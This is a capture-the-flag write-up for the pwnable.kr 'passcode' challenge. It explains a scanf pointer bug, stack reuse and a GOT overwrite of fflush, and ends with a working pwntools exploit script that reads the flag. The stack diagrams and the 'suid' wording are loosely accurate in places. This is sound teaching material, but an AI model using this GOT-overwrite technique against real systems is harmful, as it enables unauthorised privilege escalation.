# passcode Writeup

## Challenge infos

```text
Mommy told me to make a passcode based login system.
My first trial C implementation compiled without any error!
Well, there were some compiler warnings, but who cares about that?

ssh passcode@pwnable.kr -p2222 (pw:guest)
```

## Server content

```text
--- ls -la ---
total 52
drwxr-x---   5 root passcode      4096 Apr 19 10:54 .
drwxr-xr-x 118 root root          4096 Jun  1 12:05 ..
d---------   2 root root          4096 Jun 26  2014 .bash_history
-r--r-----   1 root passcode_pwn    42 Apr 19 10:48 flag
dr-xr-xr-x   2 root root          4096 Aug 20  2014 .irssi
-rw-------   1 root root          1287 Jul  2  2022 .mysql_history
-r-xr-sr-x   1 root passcode_pwn 15232 Apr 19 10:54 passcode
-rw-r--r--   1 root root           892 Apr 19 10:54 passcode.c
drwxr-xr-x   2 root root          4096 Oct 23  2016 .pwntools-cache
-rw-------   1 root root           581 Jul  2  2022 .viminfo
--- id ---
uid=1010(passcode) gid=1010(passcode) groups=1010(passcode)
--- cat file---
#include <stdio.h>
#include <stdlib.h>

void login(){
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);

        printf("checking...\n");
        if(passcode1==123456 && passcode2==13371337){
                printf("Login OK!\n");
                setregid(getegid(), getegid());
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
                exit(0);
        }
}

void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}

int main(){
        printf("Toddler's Secure Login System 1.1 beta.\n");

        welcome();
        login();

        // something after login...
        printf("Now I can safely trust you that you have credential :)\n");
        return 0;
}

--- file binary ---
passcode: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=e24d23d6babbfa731aaae3d50c6bb1c37dc9b0af, for GNU/Linux 3.2.0, not stripped
```
## Exploitation objective
* The ssh user is ```passcode```, group ```passcode```
* The ```flag``` file is readable only by the user ```passcode_pwn``` or the group ```root```
* The ```passcode``` binary is a 32bit ELF executable by the ```passcode_pwn``` user or members of the ```passcode``` group and is ```suid``` meaning that it executes with the rights of its user even if called by a member of its group

This means that if we pwn the ```passcode``` executable we can gain read access to the ```flag``` file via suid user ```passcode_pwn```.

The ```passcode``` executable is certainly compiled from the ```passcode.c``` source code, let's have a look.

## C code analysis

```c
        printf("Toddler's Secure Login System 1.1 beta.\n");

        welcome();
        login();
```
* The program starts by printing a welcome message, then calls the ```welcome()``` function and then the ```login()``` function.

```c
void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}
```

* We need the input of a name to continue, it is stored in the ```name``` variable on the stack (no buffer overflow here)


```c
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);
```

* The program asks for two passcodes, ```passcode1``` and ```passcode2```, both are integers (32bit) and stored on the stack.
* we can see there is a bug in the ```scanf()``` calls, the first argument should be a pointer to the variable where the input should be stored, but here it is passed as an integer on the stack, this is a bug that can be exploited to overwrite the stack with a value of our choice.

```c
        if(passcode1==123456 && passcode2==13371337){
                printf("Login OK!\n");
                setregid(getegid(), getegid());
                system("/bin/cat flag");
        }
```

* If the first passcode is equal to ```123456``` and the second one to ```13371337``` the program calls ```setregid()``` to set the real and effective group ID of the process to the effective group ID, this allows the process to access files that are only readable by the group of the user running the process, in our case ```passcode_pwn```, which is the owner of the ```flag``` file.
* because of the bug in the code this values cannot be set in a normal way.

## Stack Frames

* when the program is executed, a stack frame is created for each function call, the stack frame contains the local variables of the function, the return address and some other information
* the stack grows downwards, meaning that the first variable declared in a function is at the highest address and the last one at the lowest address
* the stack frame for the ```main()``` function looks like this:

```
+------------------+
| return address   | <- main return address
+------------------+
| welcome() frame  | <- welcome() stack frame
+------------------+
| name[0]          | <- name variable
+------------------+
| name[1]          |
+------------------+
| name[2]          |
+------------------+
| ...              |
+------------------+
| name[99]         |
+------------------+
```
when the ```welcome()``` function returns, the stack frame is removed and the program continues with the ```main()``` function.
* the stack frame for the ```login()``` function looks like this:

```
+------------------+
| return address   | <- login return address
+------------------+
| passcode1 frame  | <- passcode1 stack frame
+------------------+
| passcode1        | <- passcode1 variable
+------------------+
| passcode2 frame  | <- passcode2 stack frame
+------------------+
| passcode2        | <- passcode2 variable
+------------------+
```
* becuse we dont "clean" the stack after every function call, the stack frame for the ```welcome()``` function is still there when the ```login()``` function is called, so we can access the ```name``` variable from the ```welcome()``` function.
* so values from the ```welcome()``` function are still on the stack when the ```login()``` function is called, this means that we can manipulate the stack to set the values of ```passcode1``` and ```passcode2``` to whatever we want.

## GOT and PLT
* functinos from standard libraries like ```fflush()``` and ```system()``` are usually dynamically linked, meaning that the addresses of these functions are not known at compile time but are resolved at runtime (goob for code used in multiple programs so it would be sheared in memory)
* the addresses of these functions are stored in the Global Offset Table (GOT) if known at load time, if not the address of the linker function is stored in the GOT to resolve the address at runtime.
* the Procedure Linkage Table (PLT) is used to call these functions, it contains a jump instruction to the GOT entry of the function, which is then resolved to the actual address of the function if needed.
* in our case for example when the program calls ```fflush()``` the address of the function is not known at compile time, so we call a function in the PLT that jumps to the GOT entry of the ```fflush()```.
* if we can change the GOT entry of a function, we can change the address of the function to a location of our choice, this is called a GOT overwrite.
## Exploitation

* when asked for the name, we can input a string that at the end contains the address of the GOT entry of the ```fflush()``` function.
* then, when in the ```login()``` function, ```passcode1``` is overwritten with the address of the GOT entry of the ```fflush()``` function.
* when the program calls
```c
scanf("%d", passcode1);
```
* the program will read the input from the user and store it in the address of the GOT entry of the ```fflush()``` function, this means that we can overwrite the GOT entry with a value of our choice. whic is the address of the win code:
```c
                printf("Login OK!\n");
                setregid(getegid(), getegid());
                system("/bin/cat flag");
```
* this way we can execute the win code and read the ```flag``` file.

note: we know the addresses of the GOT and login code because ASLR is disabled on the server, so the addresses are always the same.


## Exploitation script

```python
#!/usr/bin/env python
from pwn import *
```
* Use [pwntools](https://github.com/Gallopsled/pwntools) for automatic exploitation
```python
passcode = ELF('./passcode')

# addres where the pointer to fflush is stored
fflush_got = passcode.got['fflush']

# address of the code we want to jump to
win_code = 0x0804928F
```
* Load the ```passcode``` binary and get the address of the ```fflush``` GOT entry and the address of the win code
```python
# create a payload to overwrite the fflush GOT entry
payload = fit({96: p32(fflush_got)}) + b'\n' + str(win_code).encode()
```
* Create a payload that overwrites the ```fflush``` GOT entry with the address of the win code, the ```fit()``` function is used to fill the buffer with the address at the right position (96 bytes from the start of the stack frame)
```python
server = ssh('passcode', 'pwnable.kr', 2222, 'guest')
io = server.process(['./passcode'])

io.sendline(payload)

io.recvuntil("Login OK!\n")
result = io.recvall()

io.close()
server.close()

print(result)
```
* Connect to the server via SSH, start the ```passcode``` process and send the payload
* Wait for the "Login OK!" message and then read the output of the program, which should contain the content of the ```flag``` file